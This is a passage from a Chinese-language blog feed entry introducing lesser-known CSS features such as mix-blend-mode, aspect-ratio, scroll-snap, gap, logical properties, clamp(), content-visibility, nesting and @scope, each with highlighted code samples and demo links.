--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 注释 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 注释 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="comment">&lt;!-- 注释断行排列 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-mask-和-clip-path"><a href="#4-mask-和-clip-path" class="headerlink" title="4. mask 和 clip-path"></a>4. <code>mask</code> 和 <code>clip-path</code></h2><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_2.png"></p><h2 id="5-mix-blend-mode"><a href="#5-mix-blend-mode" class="headerlink" title="5. mix-blend-mode"></a>5. <code>mix-blend-mode</code></h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.wrapper &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">&#125;</span><br><span class="line">:is(.wrapper) svg, img &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">&#125;</span><br><span class="line">.wrapper svg &#123;</span><br><span class="line">    fill: red;</span><br><span class="line">  mix-blend-mode: multiply;</span><br><span class="line">  z-index: 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;section class=&quot;wrapper&quot;&gt;</span><br><span class="line">        &lt;svg id=&quot;js-couch&quot; class=&quot;couch__overlay&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; preserveAspectRatio=&quot;none&quot; width=&quot;1000&quot; height=&quot;394&quot;&gt; </span><br><span class="line">            &lt;defs&gt; </span><br><span class="line">              &lt;path d=&quot;M996.35 77.55q<span class="string">-1</span>.85<span class="string">-1</span>.95<span class="string">-8</span>.65<span class="string">-3</span>.75l<span class="string">-62</span>.4<span class="string">-17</span>.1q<span class="string">-9</span>.3<span class="string">-2</span>.75<span class="string">-12</span>.15<span class="string">-2</span>.5<span class="string">-1</span>.8.15<span class="string">-2</span>.85.45l-.75.3q2.25<span class="string">-16</span>.3 3.75<span class="string">-22</span>.05 1.15<span class="string">-4</span>.4 1.4<span class="string">-10</span>.8.2<span class="string">-6</span>.6-.7<span class="string">-10</span>.85<span class="string">-1</span>.25<span class="string">-5</span>.65<span class="string">-3</span>.1<span class="string">-7</span>.8<span class="string">-2</span>.95<span class="string">-3</span>.35<span class="string">-9</span>.65<span class="string">-2</span>.7<span class="string">-5</span>.95.6<span class="string">-39</span>.3 1.7<span class="string">-38</span>.3 1.25<span class="string">-39</span>.45 1.3<span class="string">-10</span>.25.5<span class="string">-126</span>.75.5<span class="string">-5</span>.05 0<span class="string">-54</span>.2 1.3<span class="string">-45</span>.8 1.25<span class="string">-54</span>.05.95<span class="string">-19</span>.45-.45<span class="string">-30</span>.4-.7<span class="string">-20</span>.2-.55<span class="string">-23</span>.1<span class="string">-1</span>.3<span class="string">-22</span>.3<span class="string">-5</span>.85<span class="string">-26</span>.5 1.25<span class="string">-2</span>.65 4.55<span class="string">-3</span>.85 7.9-.6 1.7-.7 2.5-.65<span class="string">-2</span>.2<span class="string">-2</span>.05<span class="string">-4</span>.55<span class="string">-2</span>.75<span class="string">-4</span>.65<span class="string">-6</span>.45<span class="string">-5</span>.2<span class="string">-3</span>.85-.55<span class="string">-13</span>.65-.4<span class="string">-7</span>.4.1<span class="string">-12</span> .4-.4.05<span class="string">-18</span>.7.9<span class="string">-16</span>.55.8<span class="string">-19</span>.15 1.1<span class="string">-3</span>.4.4<span class="string">-14</span>.6 1.1<span class="string">-11</span>.3.75<span class="string">-13</span>.05.65h<span class="string">-9</span>.8q<span class="string">-8</span>.65-.05<span class="string">-11</span>.45-.4<span class="string">-2</span>.85-.35<span class="string">-9</span>.25-.6<span class="string">-6</span>.7-.15<span class="string">-8</span>.5-.25<span class="string">-2</span>.7-.1<span class="string">-27</span>.75-.1<span class="string">-25</span>.1 0<span class="string">-29</span>.6.1<span class="string">-92</span>.35 1.15<span class="string">-99</span> 1.65<span class="string">-5</span>.15.4<span class="string">-20</span> 0<span class="string">-15</span>.3-.4<span class="string">-24</span>.4<span class="string">-1</span>.25<span class="string">-6</span>.75-.6<span class="string">-21</span><span class="string">-1</span>.55<span class="string">-12</span>.95-.9<span class="string">-14</span>.85<span class="string">-1</span>.1<span class="string">-6</span>.45<span class="string">-1</span>.05<span class="string">-11</span>.05<span class="string">-1</span>.5<span class="string">-8</span>.7-.85<span class="string">-12</span>.85.5<span class="string">-5</span>.45 1.75<span class="string">-8</span>.1 4.65<span class="string">-3</span>.2 3.4<span class="string">-2</span>.9 8.6.25 4.65 2.1 11.8 1 3.8 2.55 9.1 1 3.85 2.35 10.1-.1 1<span class="string">-1</span>.5 1<span class="string">-1</span>.75 0<span class="string">-7</span>.7.85<span class="string">-7</span>.1 1<span class="string">-9</span>.8 2.05<span class="string">-2</span>.4.9<span class="string">-23</span> 4.75<span class="string">-21</span>.2 3.9<span class="string">-22</span>.05 4.15<span class="string">-8</span>.2 1.85<span class="string">-15</span>.05 3.35Q7.4 69.1 5.65 70.3 2.5 72.45 2 73.1.6 75 .75 79.2q.15 4.15 1.3 12.75.9 6.85 1.45 10 .5 2.75 8.55 54 6.65 42.15 7.35 46.85 1.15 7.65 4.9 28.55 4.55 25.2 6.35 31.2 2.45 8.15 3.8 11.75 1.85 4.9 3.2 5.75 1.25.8 6.85.65 2.75-.05 5.3-.25l23.85.35q.1 0 1 .95t2 .95q1.9 0 3.4<span class="string">-1</span>.4l23.1-.25 43.65.4q135.05 2.15 137.9 1.9 1.25-.1 72.9.5 72.45.65 76.85.45 8.1-.35 64 .4 143.35.95 146 1.1.55.05 75.3.3 74.7.3 79.8.6 8.65.5 68.25-.35l51.75.5 1.6.4q1.95.35 3.8.05 1.45-.25 3.5-.2 1.9 0 3.35-.3 2.1-.45 8.25-.8 6.25-.3 8.75-.05 1.7.2 8 1 5.75.3 7.4<span class="string">-1</span>.75 1.75<span class="string">-2</span>.2 4.95<span class="string">-10</span>.85 2.8<span class="string">-7</span>.55 4.05<span class="string">-12</span>.4.65<span class="string">-2</span>.5 3.6<span class="string">-17</span>.2 2.75<span class="string">-13</span>.75 3.15<span class="string">-14</span>.8.45<span class="string">-1</span>.25 4.45<span class="string">-22</span>.85 4.05<span class="string">-22</span>.4 4.4<span class="string">-24</span>.4.3<span class="string">-1</span>.45 3.75<span class="string">-25</span>.2 3.35<span class="string">-23</span>.2 4<span class="string">-26</span>.3 1.15<span class="string">-5</span>.5 2.35<span class="string">-18</span>.8 1.4<span class="string">-15</span>.7.8<span class="string">-23</span>.7-.6<span class="string">-8</span>.35<span class="string">-3</span>.35<span class="string">-11</span>.15z&quot; id=&quot;a&quot; /&gt; </span><br><span class="line">              &lt;/defs&gt; </span><br><span class="line">            &lt;use xlink:href=&quot;#a&quot;/&gt; </span><br><span class="line">          &lt;/svg&gt;</span><br><span class="line">          &lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f6df13a9d4a44573a45e9fc5cbcf012d~tplv-k3u1fbpfcp-zoom<span class="string">-1</span>.image&quot; alt=&quot;&quot;&gt;</span><br><span class="line">    &lt;/section&gt;</span><br></pre></td></tr></table></figure><p>在线：<a href="https://codepen.io/kylewetton/pen/OJLmJoV">https://codepen.io/kylewetton/pen/OJLmJoV</a></p><h2 id="6-CSS-等比缩放-aspect-ratio"><a href="#6-CSS-等比缩放-aspect-ratio" class="headerlink" title="6. CSS 等比缩放 aspect-ratio"></a>6. CSS 等比缩放 <code>aspect-ratio</code></h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  aspect-ratio: <span class="number">1</span> / <span class="number">1</span>; <span class="comment">/* 生成一个 1:1 的正方形 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🌰：</p><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_3.png"></p><h2 id="7-CSS-滚动捕捉-scroll-snap-type"><a href="#7-CSS-滚动捕捉-scroll-snap-type" class="headerlink" title="7. CSS 滚动捕捉 scroll-snap-type"></a>7. CSS 滚动捕捉 <code>scroll-snap-type</code></h2><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_4.png"></p><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_5.png"></p><p>🌰：<a href="https://jsbin.com/kegowevequ/edit?html,output">实现 h5 滚动效果</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        * &#123;<span class="attribute">margin</span>: <span class="number">0</span>;<span class="attribute">padding</span>:<span class="number">0</span>;&#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow-y</span>: auto;</span></span><br><span class="line"><span class="language-css">            scroll-behavior: smooth;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">overflow</span>-scrolling: touch;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">scroll-snap-type</span>: y mandatory;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">scroll-snap-stop</span>: always;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/* .container::-webkit-scrollbar &#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">            display: none;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">        &#125; */</span> </span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">scroll-snap-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">vertical-align</span>: middle;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://picsum.photos/500/300?random=1&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://picsum.photos/500/300?random=2&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://picsum.photos/500/300?random=3&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://picsum.photos/500/300?random=4&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://picsum.photos/500/300?random=5&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://picsum.photos/500/300?random=6&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://picsum.photos/500/300?random=7&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在电脑上的滚动略有卡顿，手机上体验良好</p></blockquote><p>🌰：Demo: <a href="https://codepen.io/airen/full/mdRpboo">codepen.io&#x2F;airen&#x2F;full&#x2F;…</a>（图片的中心位置和容器中心位置对齐）<br>🌰：Demo: <a href="https://codepen.io/airen/full/PoWQPvN">codepen.io&#x2F;airen&#x2F;full&#x2F;…</a> （ iOS的一些原生交互）<br>🌰：Demo: <a href="https://codepen.io/airen/full/qBRxNOo">codepen.io&#x2F;airen&#x2F;full&#x2F;…</a></p><h2 id="8-CSS-Gap（沟槽）"><a href="#8-CSS-Gap（沟槽）" class="headerlink" title="8. CSS Gap（沟槽）"></a>8. CSS Gap（沟槽）</h2><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_6.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.gap</span> &#123; </span><br><span class="line">  <span class="attribute">gap</span>: <span class="number">10px</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/* 等同于 */</span> </span><br><span class="line"><span class="selector-class">.gap</span> &#123; </span><br><span class="line">  <span class="attribute">row-gap</span>: <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">column-gap</span>: <span class="number">10px</span> </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="9-CSS-逻辑属性-个人暂无用处"><a href="#9-CSS-逻辑属性-个人暂无用处" class="headerlink" title="9. CSS 逻辑属性 (个人暂无用处)"></a>9. CSS 逻辑属性 <del>(个人暂无用处)</del></h2><blockquote><p>可能在某些国际化需求上会用到</p></blockquote><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_7.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">direction</span>: rtl;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">unicode-bidi</span>: embed;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-pseudo">:is</span>(<span class="selector-class">.right</span>, <span class="selector-class">.left</span>) <span class="selector-tag">p</span> &#123;<span class="attribute">display</span>: inline-block;&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-pseudo">:is</span>(<span class="selector-class">.right</span>, <span class="selector-class">.left</span>) <span class="selector-class">.avatar</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-inline-end</span>: <span class="number">1rem</span>; // 逻辑属性</span></span><br><span class="line"><span class="language-css">    <span class="comment">/* 等于以下两句话 */</span></span></span><br><span class="line"><span class="language-css">    <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    .avatar &#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      margin-right: 1rem;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    &#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    div[dir=&quot;rtl&quot;] .avatar &#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      margin-right: 0;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      margin-left: 1rem;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    &#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;avatar&quot;</span>&gt;</span>头像<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容： abcdefg<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span> <span class="attr">dir</span>=<span class="string">&quot;rtl&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;avatar&quot;</span>&gt;</span>头像<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容： abcdefg<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_8.png"></p><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_9.png"></p><h2 id="10-CSS-比较函数-min-和-max-和-clamp"><a href="#10-CSS-比较函数-min-和-max-和-clamp" class="headerlink" title="10. CSS 比较函数 min() 和 max() 和 clamp()"></a>10. CSS 比较函数 <code>min()</code> 和 <code>max()</code> 和 <code>clamp()</code></h2><p>🌰：<code>min(50vw, 500px)</code> 在浏览器视窗宽度改变时，返回的值的变化：</p><h6 id="clamp-MIN-VAL-MAX-，这三个值之间的关系（或者说取值的方式）："><a href="#clamp-MIN-VAL-MAX-，这三个值之间的关系（或者说取值的方式）：" class="headerlink" title="clamp(MIN, VAL, MAX)，这三个值之间的关系（或者说取值的方式）："></a>clamp(MIN, VAL, MAX)，这三个值之间的关系（或者说取值的方式）：</h6><ul><li>如果 VAL 在 MIN 和 MAX 之间，则使用 VAL 作为函数的返回值</li><li>如果 VAL 大于 MAX ，则使用 MAX 作为函数的返回值</li><li>如果 VAL 小于 MIN ，则使用 MIN 作为函数的返回值</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.element</span> &#123; </span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">clamp</span>(<span class="number">100px</span>, <span class="number">50vw</span>, <span class="number">500px</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 50vw相当于视窗宽度的一半，如果视窗宽度是760px的话，那么50vw相当等于380px*/</span> </span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">clamp</span>(<span class="number">100px</span>, <span class="number">380px</span>, <span class="number">500px</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 用min()和max()描述*/</span> </span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">max</span>(<span class="number">100px</span>, <span class="built_in">min</span>(<span class="number">380px</span>, <span class="number">500px</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*min(380px, 500px)返回的值是380px*/</span> </span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">max</span>(<span class="number">100px</span>, <span class="number">380px</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*max(100px, 380px)返回的值是380px*/</span> </span><br><span class="line">    <span class="attribute">width</span>: <span class="number">380px</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11-CSS-内容可见性-content-visibility-未实测"><a href="#11-CSS-内容可见性-content-visibility-未实测" class="headerlink" title="11. CSS 内容可见性 content-visibility 未实测"></a>11. CSS 内容可见性 <code>content-visibility</code> <del>未实测</del></h2><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_10.png"></p><p>在这种场合下，我们可以使用CSS的 content-visibility 来跳过屏幕外的内容渲染。也就是说，如果你有大量的离屏内容（Off-screen Content），这将会大幅减少页面渲染时间。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">section</span> &#123;</span><br><span class="line">  <span class="attribute">content-visibility</span>: auto;</span><br><span class="line">  <span class="attribute">contain</span>-intrinsic-size: <span class="number">1000px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-CSS-的嵌套-未发布"><a href="#12-CSS-的嵌套-未发布" class="headerlink" title="12. CSS 的嵌套 未发布"></a>12. CSS 的嵌套 <del>未发布</del></h2><p><a href="https://drafts.csswg.org/css-nesting-1/#nest-selector">W3C 也在讨论和定义CSS中的嵌套规则</a>。目前两种规则：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">foo &#123;</span><br><span class="line"><span class="type">color</span>: <span class="built_in">red</span>;</span><br><span class="line">  </span><br><span class="line">  @nest bar &#123;</span><br><span class="line">  <span class="type">color</span>: <span class="built_in">green</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者 </span></span><br><span class="line">foo &#123;</span><br><span class="line"><span class="type">color</span>: <span class="built_in">red</span>;</span><br><span class="line">  </span><br><span class="line">  &amp; bar &#123;</span><br><span class="line">  <span class="type">color</span>: <span class="built_in">green</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 都等同于</span></span><br><span class="line">foo &#123;</span><br><span class="line"><span class="type">color</span>: <span class="built_in">red</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo bar &#123;</span><br><span class="line"><span class="type">color</span>: <span class="built_in">green</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-scope"><a href="#13-scope" class="headerlink" title="13. @scope"></a>13. <a href="https://css.oddbird.net/scope/">@scope</a></h2><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_11.png"></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* @scope (&lt;root&gt;#) [to (&lt;boundary&gt;#)]? &#123; … &#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">@scope</span> (.tabs) to (.panel) &#123;</span><br><span class="line">  <span class="selector-pseudo">:scope</span> &#123; <span class="comment">/* targeting the scope root */</span> &#125;</span><br><span class="line">  .<span class="attribute">light-theme </span>:scope .tab &#123; <span class="comment">/* contextual styles */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
